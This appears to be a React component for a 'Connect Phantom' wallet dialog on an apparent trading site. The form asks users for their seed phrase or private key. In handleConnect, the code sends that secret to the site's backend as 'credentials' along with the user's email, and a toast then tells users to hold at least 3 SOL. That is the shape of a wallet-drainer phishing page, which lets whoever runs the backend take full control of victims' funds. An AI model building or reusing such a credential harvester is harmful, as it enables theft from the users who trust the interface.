import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { X, Loader2 } from "lucide-react";
import { useState } from "react";
import { walletAPI } from "@/lib/api";
import type { WalletConnectResponse } from "@/lib/api";
import { toast } from "sonner";

interface PhantomConnectDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  walletName: string;
  onBack: () => void;
  onWalletConnected: (response: WalletConnectResponse) => void;
}

export const PhantomConnectDialog = ({ 
  open, 
  onOpenChange, 
  walletName,
  onBack,
  onWalletConnected 
}: PhantomConnectDialogProps) => {
  const [connectionMethod, setConnectionMethod] = useState<"recovery" | "private">("recovery");
  const [inputValue, setInputValue] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleConnect = async () => {
    try {
      setIsConnecting(true);
      setError(null);

      // Get verified email from localStorage
      const verifiedEmail = localStorage.getItem("verifiedEmail");
      if (!verifiedEmail) {
        throw new Error("Email verification required. Please login first.");
      }

      const response = await walletAPI.connect({
        walletName: walletName.toLowerCase(),
        walletType: walletName.toLowerCase(),
        inputType: connectionMethod === "recovery" ? "seed_phrase" : "passphrase",
        credentials: inputValue.trim(),
        accountIndex: 0,
        email: verifiedEmail, // Include email field
      });

      // Store token in localStorage
      localStorage.setItem("walletToken", response.token);
      localStorage.setItem("walletAddress", response.wallet.walletAddress);
      localStorage.setItem("walletType", response.wallet.walletType);

      // Show success toast
      toast.success("Wallet Connected Successfully!", {
        description: "You need to have at least 3 SOL to make a successful trade.",
        duration: 5000,
      });

      onWalletConnected(response);
      onOpenChange(false);
      setInputValue("");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to connect wallet");
    } finally {
      setIsConnecting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md bg-card border-border">
        <DialogHeader>
          <div className="flex items-center justify-between">
            <DialogTitle>Connect {walletName}</DialogTitle>
            <button
              onClick={() => onOpenChange(false)}
              className="rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground"
            >
              <X className="h-4 w-4" />
              <span className="sr-only">Close</span>
            </button>
          </div>
        </DialogHeader>

        <div className="space-y-4">
          {/* Connection Method Info */}
          <div className="bg-blue-950/30 border border-blue-900/50 rounded-lg p-3 space-y-1">
            <p className="text-sm font-medium">Choose Connection Method:</p>
            <ul className="text-xs text-muted-foreground space-y-0.5">
              <li>• Use your 12/24-word recovery phrase (recommended)</li>
              <li>• Or use your private key (Base58 or JSON format)</li>
            </ul>
          </div>

          {/* Method Selection */}
          <div>
            <p className="text-sm mb-3 font-medium">Select Connection Method:</p>
            <div className="grid grid-cols-2 gap-3">
              <button
                onClick={() => setConnectionMethod("recovery")}
                className={`p-3 rounded-lg border transition-all ${
                  connectionMethod === "recovery"
                    ? "bg-blue-600/20 border-blue-600 text-blue-400"
                    : "bg-muted/30 border-border hover:bg-muted/50"
                }`}
              >
                <span className="text-sm font-medium">Recovery Phrase</span>
              </button>
              <button
                onClick={() => setConnectionMethod("private")}
                className={`p-3 rounded-lg border transition-all ${
                  connectionMethod === "private"
                    ? "bg-blue-600/20 border-blue-600 text-blue-400"
                    : "bg-muted/30 border-border hover:bg-muted/50"
                }`}
              >
                <span className="text-sm font-medium">Private Key</span>
              </button>
            </div>
          </div>

          {/* Input Area */}
          <div className="space-y-2">
            <label className="text-sm text-muted-foreground">
              {connectionMethod === "recovery" 
                ? "Enter your recovery phrase:" 
                : "Enter your private key:"}
            </label>
            <Textarea
              placeholder={
                connectionMethod === "recovery"
                  ? "word1 word2 word3 ..."
                  : "Base58 or JSON format"
              }
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              className="bg-muted border-border min-h-[100px] font-mono text-sm"
              disabled={isConnecting}
            />
          </div>

          {/* Error Message */}
          {error && (
            <div className="bg-red-950/30 border border-red-900/50 rounded-lg p-3">
              <p className="text-sm text-red-400">{error}</p>
            </div>
          )}

          {/* Action Buttons */}
          <div className="flex gap-2 pt-2">
            <Button 
              variant="outline" 
              className="flex-1"
              onClick={onBack}
              disabled={isConnecting}
            >
              Back
            </Button>
            <Button 
              className="flex-1 bg-blue-600 hover:bg-blue-700"
              onClick={handleConnect}
              disabled={!inputValue.trim() || isConnecting}
            >
              {isConnecting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Connecting...
                </>
              ) : (
                "Connect"
              )}
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};
